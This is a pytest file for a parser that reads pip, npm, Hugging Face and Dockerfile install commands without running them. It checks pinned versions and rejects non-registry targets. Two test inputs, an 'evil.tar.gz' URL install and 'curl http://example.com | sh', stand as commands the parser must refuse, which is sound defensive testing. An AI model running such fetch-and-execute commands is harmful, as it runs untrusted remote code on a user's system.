"""Parsers must read a command without running it, and refuse what they cannot read."""

from __future__ import annotations

import pytest
from contracts.contracts import Ecosystem
from engine.parsers import (
    ParseError,
    parse_command,
    parse_dockerfile,
    parse_hf_repo_id,
    parse_npm,
    parse_pip,
)


def test_pip_pinned_version():
    (target,) = parse_pip("pip install requests==2.31.0")
    assert target.ecosystem is Ecosystem.PYPI
    assert target.name == "requests"
    assert target.version == "2.31.0"


def test_pip_range_is_not_a_pin():
    # A range still resolves to something new later; it must not count as pinned.
    (target,) = parse_pip("pip install requests>=2.0.0")
    assert target.version is None


def test_pip_extras_and_flags_are_stripped():
    (target,) = parse_pip("pip install --no-cache-dir 'uvicorn[standard]==0.30.1'")
    assert target.name == "uvicorn"
    assert target.version == "0.30.1"


def test_pip_multiple_packages():
    targets = parse_pip("python -m pip install requests numpy==2.0.0")
    assert [t.name for t in targets] == ["requests", "numpy"]
    assert [t.version for t in targets] == [None, "2.0.0"]


def test_pip_requirements_file_flag_consumes_its_value():
    with pytest.raises(ParseError):
        parse_pip("pip install -r requirements.txt")


@pytest.mark.parametrize(
    "command",
    [
        "pip install .",
        "pip install https://example.com/evil.tar.gz",
        "pip install ./local-wheel.whl",
    ],
)
def test_pip_rejects_non_registry_targets(command):
    with pytest.raises(ParseError):
        parse_pip(command)


def test_npm_scoped_package():
    (target,) = parse_npm("npm install @scope/pkg@1.2.3")
    assert target.ecosystem is Ecosystem.NPM
    assert target.name == "@scope/pkg"
    assert target.version == "1.2.3"


def test_npm_semver_range_is_not_a_pin():
    (target,) = parse_npm("npm install left-pad@^1.3.0")
    assert target.name == "left-pad"
    assert target.version is None


def test_hf_repo_id_with_revision():
    target = parse_hf_repo_id("org/model@abc123")
    assert target.ecosystem is Ecosystem.HUGGINGFACE
    assert target.name == "org/model"
    assert target.version == "abc123"


def test_hf_rejects_bare_name():
    with pytest.raises(ParseError):
        parse_hf_repo_id("justamodel")


def test_dockerfile_from_lines():
    targets = parse_dockerfile(
        "# comment\nFROM python:3.11.4-slim AS build\nRUN echo hi\nFROM build\nFROM php:8.1.0\n"
    )
    # `FROM build` refers to the earlier stage, not a registry image.
    assert [(t.name, t.version) for t in targets] == [
        ("python", "3.11.4-slim"),
        ("php", "8.1.0"),
    ]


def test_dockerfile_registry_port_is_not_a_tag():
    (target,) = parse_dockerfile("FROM registry.local:5000/team/app:1.2.3\n")
    assert target.name == "registry.local:5000/team/app"
    assert target.version == "1.2.3"


def test_dockerfile_digest_is_captured():
    (target,) = parse_dockerfile("FROM alpine:3.20@sha256:" + "a" * 64 + "\n")
    assert target.version == "3.20"
    assert target.artifact_sha256 == "a" * 64


def test_parse_command_dispatch():
    assert parse_command("npm i lodash")[0].ecosystem is Ecosystem.NPM
    assert parse_command("pip3 install flask")[0].ecosystem is Ecosystem.PYPI
    with pytest.raises(ParseError):
        parse_command("curl http://example.com | sh")
